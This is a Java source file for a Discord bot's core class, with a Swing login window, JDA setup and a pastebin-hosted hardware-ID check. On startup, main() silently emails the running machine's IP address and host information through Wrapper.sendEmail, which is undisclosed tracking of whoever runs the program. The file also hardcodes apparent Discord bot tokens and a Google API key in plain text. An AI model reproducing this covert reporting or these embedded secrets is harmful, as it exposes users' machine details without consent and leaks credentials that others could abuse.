package me.comu.exeter.core;

import me.comu.exeter.wrapper.Wrapper;
import net.dv8tion.jda.api.JDA;

import javax.swing.*;
import java.awt.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Core {

    public static JDA jda;
    public static final long OWNERID = 358689720596955148L;
    static final String HWIDURL = "https://pastebin.com/raw/mGiKYJrV";
    //    private static final String TOKEN ="MzIwMzc4Nzk1MTkyNDgzODQx.XnjFPg.o5CiN0qZ4MQkUMwZjRLGy1EQY80";
    public static final String TOKEN = "NjkyNDU2MDQyNjE3MTEwNjE4.Xn_Ptw.RduprcSuMb7FfQwZsR2X2b17-vs";
    //public static final String youtubeAPIKey = "AIzaSyAls9zrVVQtZksm-tMrKLhmXx3T1hrt_5c";
    public static final String DEBUG = "[DEBUG] ";
    public static String PREFIX = ";;";

    public static void main(final String[] args) {
        new Core();
        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
        try {
            for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InstantiationException ex2) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex2);
        } catch (IllegalAccessException ex3) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex3);
        } catch (UnsupportedLookAndFeelException ex4) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex4);
        }
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new LoginGUI().setVisible(true); }
});
    }

    private Core() {
/*        EventWaiter eventWaiter = new EventWaiter();
        EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
        WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
        CommandManager commandManager = new CommandManager(eventWaiter);
        Listener listener = new Listener(commandManager);
        org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
        WebUtils.setUserAgent("Mozilla/5.0 | Discord Bot");

        try {
            jda = JDABuilder.create(Core.TOKEN, GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
            logger.info("Successfully Booted");
            jda.addEventListener(new KickEvent());
            jda.addEventListener(new BanEvent());
            jda.addEventListener(new LogMessageReceivedEvent());
            jda.addEventListener(new RainbowRoleEvent());
            jda.addEventListener(new AntiRaidEvent());
            jda.addEventListener(new EditEvent(commandManager));
            jda.addEventListener(new GuildMemberJoinedEvent());
            jda.addEventListener(new GuildMemberLeaveEvent());
            jda.addEventListener(new GuildMessageListenerResponderEvent());
            jda.addEventListener(new OffEvent());
            jda.addEventListener(new MemberCountChannelEvent());
            jda.addEventListener(new FilterEvent());
            jda.addEventListener(new CreditOnMessageEvent());
            jda.addEventListener(new VoiceChannelCreditsEvent());
            jda.addEventListener(new VCTimeTrackingEvent());
            jda.addEventListener(new MarriageEvent());
            jda.addEventListener(new DMWizzEvent());
            jda.addEventListener(new SuggestionMessageCleanerEvent());
            jda.addEventListener(new CreateAChannelEvent());
            jda.addEventListener(new AIPEvent());
            Logger.getLogger().print("Loaded Events");
        } catch (LoginException | InterruptedException e) {
            logger.info("Caught Exception! (LoginException | InterruptedException)");
        }*/
    }

    public static void shutdownThread() {
        LoginGUI.running = false;
        LoginGUI.jStatusField.setText("NOT RUNNING");
        jda.shutdownNow();
    }


}

//    new Timer().scheduleAtFixedRate(new TimerTask(){
//          @Override
//            public void run(){
//jda.getPresence().setActivity(Activity.watching(String.format("over %s users", jda.getGuildById("645841446817103912").getMembers().size())));
//              }
//            },0,5000);